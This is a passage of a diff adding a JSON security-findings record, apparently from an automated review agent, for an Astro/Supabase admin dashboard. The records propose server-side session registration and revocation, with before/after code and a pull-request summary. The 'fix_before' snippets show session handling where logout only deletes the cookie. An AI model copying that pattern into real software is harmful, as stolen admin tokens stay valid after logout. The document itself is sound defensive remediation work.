1000).toISOString(),\n\t});\n\n\tif (error) {\n\t\tthrow new Error(\"No se pudo registrar la sesion de administrador\");\n\t}\n\n\treturn token;\n};\n\nexport const verifyAdminSession = (token?: string) =>\n\tparseAdminSession(token) !== null;\n\nexport const isAdminSessionActive = async (token?: string) => {\n\tconst session = parseAdminSession(token);\n\n\tif (!session) return false;\n\n\tconst { data, error } = await supabaseAdmin\n\t\t.from(ADMIN_SESSION_TABLE)\n\t\t.select(\"session_id\")\n\t\t.eq(\"session_id\", session.sessionId)\n\t\t.is(\"revoked_at\", null)\n\t\t.gt(\"expires_at\", new Date().toISOString())\n\t\t.maybeSingle();\n\n\treturn !error && Boolean(data);\n};\n\nexport const revokeAdminSession = async (token?: string) => {\n\tconst session = parseAdminSession(token);\n\n\tif (!session) return;\n\n\tconst { error } = await supabaseAdmin\n\t\t.from(ADMIN_SESSION_TABLE)\n\t\t.update({ revoked_at: new Date().toISOString() })\n\t\t.eq(\"session_id\", session.sessionId)\n\t\t.is(\"revoked_at\", null);\n\n\tif (error) {\n\t\tthrow new Error(\"No se pudo invalidar la sesion de administrador\");\n\t}\n};"
+      },
+      {
+        "file": "src/pages/dashboard/login.ts",
+        "start_line": 46,
+        "end_line": 62,
+        "snippet": "  if (\n    typeof password === \"string\" &&\n    password.length <= 1024 &&\n    constantTimeEquals(password, adminPassword)\n  ) {\n\n    cookies.set(\n      ADMIN_SESSION_COOKIE,\n      createAdminSession(),\n      {\n        path: \"/dashboard\",\n        httpOnly: true,\n        sameSite: \"strict\",\n        secure: import.meta.env.PROD,\n        maxAge: ADMIN_SESSION_MAX_AGE\n      }\n    );",
+        "label": "Await server-side session registration before issuing the cookie",
+        "fix_before": "  if (\n    typeof password === \"string\" &&\n    password.length <= 1024 &&\n    constantTimeEquals(password, adminPassword)\n  ) {\n\n    cookies.set(\n      ADMIN_SESSION_COOKIE,\n      createAdminSession(),\n      {\n        path: \"/dashboard\",\n        httpOnly: true,\n        sameSite: \"strict\",\n        secure: import.meta.env.PROD,\n        maxAge: ADMIN_SESSION_MAX_AGE\n      }\n    );",
+        "fix_after": "  if (\n    typeof password === \"string\" &&\n    password.length <= 1024 &&\n    constantTimeEquals(password, adminPassword)\n  ) {\n\n    cookies.set(\n      ADMIN_SESSION_COOKIE,\n      await createAdminSession(),\n      {\n        path: \"/dashboard\",\n        httpOnly: true,\n        sameSite: \"strict\",\n        secure: import.meta.env.PROD,\n        maxAge: ADMIN_SESSION_MAX_AGE\n      }\n    );"
+      },
+      {
+        "file": "src/pages/dashboard/logout.ts",
+        "start_line": 1,
+        "end_line": 17,
+        "snippet": "import type { APIRoute } from \"astro\";\nimport { ADMIN_SESSION_COOKIE } from \"../../lib/admin-session\";\n\nexport const POST: APIRoute = async ({\n  cookies,\n  redirect\n}) => {\n\n  cookies.delete(\n    ADMIN_SESSION_COOKIE,\n    {\n      path: \"/dashboard\"\n    }\n  );\n\n  return redirect(\"/dashboard\", 303);\n};",
+        "label": "Revoke the server-side session before deleting the browser cookie",
+        "fix_before": "import type { APIRoute } from \"astro\";\nimport { ADMIN_SESSION_COOKIE } from \"../../lib/admin-session\";\n\nexport const POST: APIRoute = async ({\n  cookies,\n  redirect\n}) => {\n\n  cookies.delete(\n    ADMIN_SESSION_COOKIE,\n    {\n      path: \"/dashboard\"\n    }\n  );\n\n  return redirect(\"/dashboard\", 303);\n};",
+        "fix_after": "import type { APIRoute } from \"astro\";\nimport {\n  ADMIN_SESSION_COOKIE,\n  revokeAdminSession,\n} from \"../../lib/admin-session\";\n\nexport const POST: APIRoute = async ({\n  cookies,\n  redirect\n}) => {\n  await revokeAdminSession(\n    cookies.get(ADMIN_SESSION_COOKIE)?.value\n  );\n\n  cookies.delete(\n    ADMIN_SESSION_COOKIE,\n    {\n      path: \"/dashboard\"\n    }\n  );\n\n  return redirect(\"/dashboard\", 303);\n};"
+      },
+      {
+        "file": "src/middleware.ts",
+        "start_line": 1,
+        "end_line": 5,
+        "snippet": "import { defineMiddleware } from \"astro:middleware\";\nimport {\n\tADMIN_SESSION_COOKIE,\n\tverifyAdminSession,\n} from \"./lib/admin-session\";",
+        "label": "Use the active-session check in middleware imports",
+        "fix_before": "import { defineMiddleware } from \"astro:middleware\";\nimport {\n\tADMIN_SESSION_COOKIE,\n\tverifyAdminSession,\n} from \"./lib/admin-session\";",
+        "fix_after": "import { defineMiddleware } from \"astro:middleware\";\nimport {\n\tADMIN_SESSION_COOKIE,\n\tisAdminSessionActive,\n} from \"./lib/admin-session\";"
+      },
+      {
+        "file": "src/middleware.ts",
+        "start_line": 51,
+        "end_line": 55,
+        "snippet": "\tif (\n\t\tisDashboardRoute &&\n\t\t!PUBLIC_DASHBOARD_PATHS.has(pathname) &&\n\t\t!verifyAdminSession(context.cookies.get(ADMIN_SESSION_COOKIE)?.value)\n\t) {",
+        "label": "Reject revoked dashboard sessions, not just malformed ones",
+        "fix_before": "\tif (\n\t\tisDashboardRoute &&\n\t\t!PUBLIC_DASHBOARD_PATHS.has(pathname) &&\n\t\t!verifyAdminSession(context.cookies.get(ADMIN_SESSION_COOKIE)?.value)\n\t) {",
+        "fix_after": "\tif (\n\t\tisDashboardRoute &&\n\t\t!PUBLIC_DASHBOARD_PATHS.has(pathname) &&\n\t\t!(await isAdminSessionActive(\n\t\t\tcontext.cookies.get(ADMIN_SESSION_COOKIE)?.value,\n\t\t))\n\t) {"
+      }
+    ],
+    "fix_pr_body": "## Summary\nThis change replaces the logout-only cookie deletion model with a revocable dashboard session model. Each signed `crm_session` now carries a session identifier that is also registered server-side, logout revokes that server-side record, and middleware grants access only when the signed token is both cryptographically valid and still active.\n\n## Rationale\nThe previous implementation treated the cookie as a fully self-contained bearer token. Deleting that cookie from the current browser did not affect any copied token, so a stolen pre-logout session remained valid until expiry. Server-side revocation closes that gap and makes logout meaningful.\n\n## Rollout notes\nThis change requires a small Supabase migration for a dedicated `admin_sessions` table with at least `session_id`, `expires_at`, `revoked_at`, and `created_at` columns, plus a policy posture that keeps the table inaccessible to `anon` and `authenticated` roles. After the migration is applied, expired records can be purged periodically as maintenance.",
+    "finding_class": "dynamic",
+    "agent_id": "455f5116",
+    "agent_name": "Dashboard Session Persistence Reporting Agent"
+  }
+]
